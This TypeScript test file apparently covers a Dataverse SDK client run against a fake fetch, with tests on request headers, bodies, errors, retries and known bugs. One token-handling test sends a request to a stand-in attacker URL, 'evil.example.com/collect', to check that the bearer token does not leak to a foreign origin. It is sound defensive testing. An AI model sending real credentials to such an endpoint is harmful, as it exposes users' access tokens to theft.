/**
 * Contract tests for @mohsinonxrm/dataverse-sdk-core: a real DataverseClient against a fake fetch.
 *
 * Tests marked `it.fails` pin a known bug. Each names its issue. When a fix lands, the test
 * starts passing, so `it.fails` reports it as a failure: flip it to `it` in the fixing PR.
 */
import { describe, it, expect } from "vitest";
import {
  TEST_API_URL,
  createTestClient,
  createdResponse,
  jsonResponse,
  noContent,
  odataError,
  throttled,
} from "../src/index.js";

describe("core: request wire format", () => {
  it("GET sends the bearer token and OData headers", async () => {
    const { client, fake } = createTestClient();
    fake.on("GET", "/accounts", () => jsonResponse({ value: [] }));
    await client.api("accounts").select("name").top(1).get();
    const r = fake.last();
    expect(r.method).toBe("GET");
    expect(r.headers.authorization).toBe("Bearer test-token");
    expect(r.headers["odata-version"]).toBe("4.0");
    expect(r.headers["odata-maxversion"]).toBe("4.0");
    expect(new URL(r.url).searchParams.get("$select")).toBe("name");
    expect(new URL(r.url).searchParams.get("$top")).toBe("1");
  });

  it("POST of an object sends JSON with a JSON content type", async () => {
    const { client, fake } = createTestClient();
    fake.on("POST", "/accounts", () =>
      createdResponse("accounts", "00000000-0000-0000-0000-000000000001")
    );
    await client.api("accounts").post({ name: "Contoso" });
    const r = fake.last();
    expect(JSON.parse(r.bodyText ?? "")).toEqual({ name: "Contoso" });
    expect(r.headers["content-type"]).toMatch(/^application\/json/);
  });

  it.fails("#7: a string body reaches fetch unchanged (today it is JSON-stringified)", async () => {
    const { client, fake } = createTestClient();
    fake.on("POST", "/accounts", () => noContent());
    const raw = '{"name":"Contoso"}';
    await client.send({
      method: "POST",
      url: `${TEST_API_URL}/accounts`,
      headers: { "content-type": "application/json" },
      body: raw,
    });
    expect(fake.last().bodyText).toBe(raw);
  });

  it.fails("#7: binary bodies reach fetch unchanged", async () => {
    const { client, fake } = createTestClient();
    fake.on("PATCH", /^\/accounts/, () => noContent());
    const bytes = new Uint8Array([0, 1, 2, 255]);
    await client.send({
      method: "PATCH",
      url: `${TEST_API_URL}/accounts(00000000-0000-0000-0000-000000000001)/file`,
      headers: { "content-type": "application/octet-stream" },
      body: bytes,
    });
    expect(Array.from(fake.last().bodyBytes ?? [])).toEqual([0, 1, 2, 255]);
  });

  it("#9: a caller's Content-Type is not duplicated by the SDK default", async () => {
    const { client, fake } = createTestClient();
    fake.on("POST", "/accounts", () => noContent());
    await client.send({
      method: "POST",
      url: `${TEST_API_URL}/accounts`,
      headers: { "Content-Type": "application/json" },
      body: { name: "Contoso" },
    });
    expect(fake.last().headers["content-type"]).toBe("application/json");
  });

  it("#10: a long $filter is not rejected by URL validation", async () => {
    const { client, fake } = createTestClient();
    fake.on("GET", "/accounts", () => jsonResponse({ value: [] }));
    const filter = Array.from(
      { length: 40 },
      (_, i) => `name eq 'account number ${String(i)}'`
    ).join(" or ");
    await client.api("accounts").filter(filter).get();
    expect(fake.requests).toHaveLength(1);
  });
});

describe("core: responses", () => {
  it("parses JSON bodies", async () => {
    const { client, fake } = createTestClient();
    fake.on("GET", "/WhoAmI", () => jsonResponse({ UserId: "u1" }));
    expect(await client.api("WhoAmI").get()).toEqual({ UserId: "u1" });
  });

  it("maps an OData error to a typed error with status and code", async () => {
    const { client, fake } = createTestClient();
    fake.on("GET", /^\/accounts/, () =>
      odataError(404, "0x80040217", "account With Id = x Does Not Exist")
    );
    await expect(client.api("accounts(x)").get()).rejects.toMatchObject({
      status: 404,
      code: "0x80040217",
    });
  });

  it.fails("#11: get() on a 204 response resolves instead of throwing", async () => {
    const { client, fake } = createTestClient();
    fake.on("GET", "/accounts", () => noContent());
    await expect(client.api("accounts").get()).resolves.toBeUndefined();
  });

  it.fails("#19: errors expose the x-ms-service-request-id Dataverse sends", async () => {
    const { client, fake } = createTestClient();
    fake.on("GET", "/accounts", () => odataError(400, "0x80060888", "Bad request"));
    const err = (await client
      .api("accounts")
      .get()
      .catch((e: unknown) => e)) as { requestId?: string };
    expect(err.requestId).toBe("989ceedc-cfb9-49b4-9630-c1e8ab9fcf43");
  });
});

describe("core: retries", () => {
  it("retries a GET after a 429 and returns the next response", async () => {
    const { client, fake } = createTestClient({
      retry: { maxRetries: 1, baseDelayMs: 1, maxDelayMs: 5 },
    });
    fake.on("GET", "/WhoAmI", () => jsonResponse({ UserId: "u1" }));
    fake.on("GET", "/WhoAmI", () => throttled(0), 1);
    expect(await client.api("WhoAmI").get()).toEqual({ UserId: "u1" });
    expect(fake.requests).toHaveLength(2);
  });

  it.fails("#12: a POST that gets a 504 is not replayed", async () => {
    const { client, fake } = createTestClient({
      retry: { maxRetries: 1, baseDelayMs: 1, maxDelayMs: 5 },
    });
    fake.on("POST", "/accounts", () => noContent());
    fake.on("POST", "/accounts", () => odataError(504, "0x0", "Gateway Timeout"), 1);
    await client
      .api("accounts")
      .post({ name: "Contoso" })
      .catch(() => undefined);
    expect(fake.requests).toHaveLength(1);
  });
});

describe("core: token handling", () => {
  it.fails("#8: the bearer token is not sent to a different origin", async () => {
    const { client, fake } = createTestClient({}, { onUnhandled: () => jsonResponse({}) });
    await client.api("https://evil.example.com/collect").get();
    expect(fake.last().headers.authorization).toBeUndefined();
  });
});
